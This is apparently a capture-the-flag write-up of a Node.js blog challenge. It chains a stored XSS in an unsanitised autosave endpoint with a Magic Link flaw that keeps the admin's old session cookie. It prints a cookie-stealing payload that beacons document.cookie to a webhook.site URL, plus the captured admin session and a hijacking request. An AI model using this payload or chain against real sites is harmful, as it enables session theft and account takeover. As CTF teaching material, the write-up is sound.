# Personal Blog: The Art of the Session Stack

**Category:** Web Exploitation  
**Difficulty:** Easy - Medium 

---

## TL;DR

A stored XSS in an autosave endpoint can be triggered immediately after a Magic Link login. Because the application *persists the previous session ID client-side*, an administrator who clicks an attacker-controlled Magic Link unknowingly exposes their privileged session. The result is a clean **Account Takeover via client-side session resurrection**.

---

## 1. Reconnaissance & Source Analysis

The application is a **Node.js / Express** app using **EJS** for templating. It allows users to:
- Register accounts
- Create private blog posts
- Generate *Magic Links* for passwordless login

I began by reviewing the provided source code, focusing on `server.js`, and immediately noticed two unusual behaviors.

---

### A. The “Autosave” Anomaly (Stored XSS)

The application supports two ways to save posts:
- `POST /api/save` – triggered manually via the **Save** button  
- `POST /api/autosave` – triggered automatically by the editor  

The difference in handling user input is critical.

#### Safe Endpoint
```js
// server.js - /api/save (Safe)
app.post('/api/save', requireLogin, (req, res) => {
  const rawContent = String(req.body.content || '');
  const sanitized = sanitizeHtml(rawContent); // Sanitized
  post.savedContent = sanitized;
  post.draftContent = sanitized;
});
```

#### Vulnerable Endpoint
```js
// server.js - /api/autosave (Vulnerable)
app.post('/api/autosave', requireLogin, (req, res) => {
  const rawContent = String(req.body.content || '');
  post.draftContent = rawContent; // RAW INPUT
});
```

The autosave endpoint stores raw HTML without sanitization.

When the editor page is loaded, this content is rendered using unescaped EJS syntax:

```html
<div id="editor"><%- draftContent %></div>
```

This allows **stored XSS** that triggers whenever the post editor is opened.

---

### B. The “Session Stacking” Feature (Logic Flaw)

The Magic Link login handler contains an unusual feature meant to “remember” previous sessions:

```js
// server.js - /magic/:token
const existingSid = req.cookies.sid;
if (existingSid) {
  res.cookie('sid_prev', existingSid, cookieOptions());
}
const sid = createSession(db, record.userId);
res.cookie('sid', sid, cookieOptions());
```

If a logged-in **Administrator** clicks a Magic Link belonging to another user:

1. The admin is logged in as the attacker  
2. The **admin’s session ID** is stored in `sid_prev`  
3. Both cookies are sent to the browser  

This creates a dangerous **session stacking** condition.

---

## 2. The Exploit Chain

The vulnerabilities were chained together as follows:

1. **Trap** – Inject stored XSS using `/api/autosave`
2. **Bait** – Generate a Magic Link for the attacker account
3. **Switch** – Admin clicks the Magic Link
4. **Exfiltration** – XSS steals `sid_prev` (admin session)

Execution flow:

```
Admin clicks link
→ Logs in as attacker
→ Admin session saved to sid_prev
→ Redirect to malicious editor page
→ XSS executes
→ Cookies exfiltrated
```

---

## 3. Step-by-Step Exploitation

### Step 1: Weaponizing XSS

After creating a post (ID = `40`), I manually triggered autosave with a malicious payload:

```js
fetch('/api/autosave', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({
    postId: <ID>,
    content: `<img src=x onerror="navigator.sendBeacon('https://webhook.site/MY-UUID?c='+btoa(document.cookie))">`
  })
});
```

Refreshing the page confirmed the XSS was active.

---

### Step 2: Preparing the Magic Link

A Magic Link was generated for the attacker account:

```
/magic/<TOKEN>?redirect=/edit/<ID>
```

**Important:**  
The link used `localhost:3000`, not the public IP, because the admin bot runs internally.(plus you can't since there is a blocker that stops you either way)

---

### Step 3: Phishing the Admin

The malicious URL was submitted via the `/report` endpoint after solving the required proof-of-work challenge.

---

### Step 4: Stealing the Session

The webhook received:

```
c=c2lkX3ByZXY9MjNjMTVmNDQ1NDI4ODNjMGJlZDA4NzNmZDRjZGZkZjc0ZDQ0OyBzaWQ9...
```

After Base64 decoding:

```
sid_prev=23c15f44542883c0bed0873fd4cdfdf74d44
```

This was the **admin’s session ID**.

---

## 4. Account Takeover & Flag

Code section that allows reading of flag:
```js
app.get('/flag', requireLogin, (req, res) => {
  if (!req.user.isAdmin) return;
  return res.send(FLAG);
});
```

Send a GET request to /flag with the admin cookie.

```http
GET /flag HTTP/1.1
Host: 34.26.148.28:5000
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1

User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7

Referer: http://34.26.148.28:5000/dashboard

Accept-Encoding: gzip, deflate, br

Cookie: sid=23c15f44542883c0bed0873fd4cdfdf74d44

Connection: keep-alive

```

Response
```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 43
ETag: W/"2b-W07gVhdZUtLigfb4ewPyCwzKqdI"
Date: Sat, 10 Jan 2026 07:20:00 GMT
Connection: keep-alive
Keep-Alive: timeout=5

uoftctf{533M5_l1k3_17_W4snt_50_p3r50n41...}
```

**Flag:**
```
uoftctf{533M5_l1k3_17_W4snt_50_p3r50n41...}
```

---

## Conclusion

This challenge demonstrates how **minor vulnerabilities can compound into a full system compromise**.

### Key Takeaways

- **Sanitize Everything** – Internal endpoints are not trusted
- **Session Hygiene Matters** – Never persist old sessions client-side
- **Context Awareness** – Exploits must be crafted from the bot’s perspective.

# Writeup by Shanks

[![Twitter/X](https://img.shields.io/badge/Twitter-shankscx-black?style=flat&logo=x)](https://x.com/shankscx)

---
